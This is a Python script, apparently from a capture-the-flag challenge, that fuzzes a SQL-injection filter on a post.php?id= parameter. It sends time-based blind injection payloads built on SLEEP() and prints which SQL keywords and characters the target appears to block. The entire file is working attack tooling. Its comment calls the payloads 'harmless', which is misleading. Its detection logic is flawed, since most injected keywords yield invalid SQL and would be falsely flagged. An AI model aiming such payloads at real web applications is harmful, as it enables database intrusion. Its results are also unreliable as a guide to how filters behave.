import requests
import time
import statistics
from urllib.parse import quote

# Target URL with vulnerable parameter
base_url = "http://filtered.challs.cyberchallenge.it/post.php?id="

# List of common SQL keywords and operators to test
keywords_to_test = [
    # Common SQL keywords
    "AND", "OR", "SELECT", "FROM", "WHERE", "HAVING", "GROUP", "ORDER",
    "BY", "UNION", "JOIN", "INNER", "OUTER", "LEFT", "RIGHT", "FULL",
    "INSERT", "UPDATE", "DELETE", "DROP", "ALTER", "CREATE", "TABLE",
    "DATABASE", "TRUNCATE", "INTO", "VALUES", "SET", "AS", "DISTINCT",

    # Functions
    "COUNT", "SUM", "AVG", "MIN", "MAX", "CONCAT", "SUBSTRING", "LENGTH",
    "SLEEP", "BENCHMARK", "DELAY", "IF", "IFNULL", "NULLIF", "CASE", "WHEN",
    "THEN", "ELSE", "END", "EXISTS", "IN", "LIKE", "REGEXP", "BETWEEN",
    "IS", "NULL", "TRUE", "FALSE",

    # Special characters
    ";", "--", "/*", "*/", "#", "\\", "'", "\"", "`", "(", ")"
]

# Number of times to test each keyword for consistency
TEST_ITERATIONS = 3
# Baseline sleep time in seconds
SLEEP_TIME = 2


def test_keyword(keyword):
    """
    Test if a keyword is blacklisted by trying to use it in a query.
    Returns True if keyword appears to be blacklisted.
    """
    # Prepare harmless queries that include the keyword
    base_payload = f"1' OR IF(1=1, SLEEP({SLEEP_TIME}), 0)-- -"
    test_payload = f"1' OR {keyword} IF(1=1, SLEEP({SLEEP_TIME}), 0)-- -"

    base_times = []
    test_times = []

    # Run multiple tests to reduce false positives
    for _ in range(TEST_ITERATIONS):
        # Test baseline query
        start_time = time.time()
        requests.get(base_url + quote(base_payload))
        elapsed = time.time() - start_time
        base_times.append(elapsed)

        # Brief pause between requests
        time.sleep(0.5)

        # Test query with the keyword
        start_time = time.time()
        response = requests.get(base_url + quote(test_payload))
        elapsed = time.time() - start_time
        test_times.append(elapsed)

        # Brief pause between tests
        time.sleep(0.5)

    # Calculate average response times
    avg_base = statistics.mean(base_times)
    avg_test = statistics.mean(test_times)

    # If the test query is significantly faster than the baseline,
    # the keyword might be blacklisted (query didn't execute properly)
    # Less than 50% of baseline time
    is_blacklisted = avg_test < (avg_base * 0.5)

    # Also check HTTP status code and content length
    if response.status_code != 200:
        is_blacklisted = True

    # Check if test query didn't produce expected delay
    if avg_test < SLEEP_TIME * 0.8:
        is_blacklisted = True

    return is_blacklisted, avg_base, avg_test


def main():
    print("=== SQL Keyword Blacklist Tester ===")
    print(f"Testing against: {base_url}")
    print(f"Running {TEST_ITERATIONS} tests per keyword...\n")

    blacklisted = []
    allowed = []

    for keyword in keywords_to_test:
        print(f"Testing keyword: {keyword}")
        is_banned, base_time, test_time = test_keyword(keyword)

        if is_banned:
            result = "BLACKLISTED"
            blacklisted.append(keyword)
        else:
            result = "ALLOWED"
            allowed.append(keyword)

        print(f"  Result: {result}")
        print(f"  Base query time: {base_time:.2f}s")
        print(f"  Test query time: {test_time:.2f}s\n")

    # Summary
    print("\n=== SUMMARY ===")
    print(f"Total keywords tested: {len(keywords_to_test)}")
    print(f"Blacklisted keywords ({len(blacklisted)}): {
          ', '.join(blacklisted)}")
    print(f"Allowed keywords ({len(allowed)}): {', '.join(allowed)}")


if __name__ == "__main__":
    main()
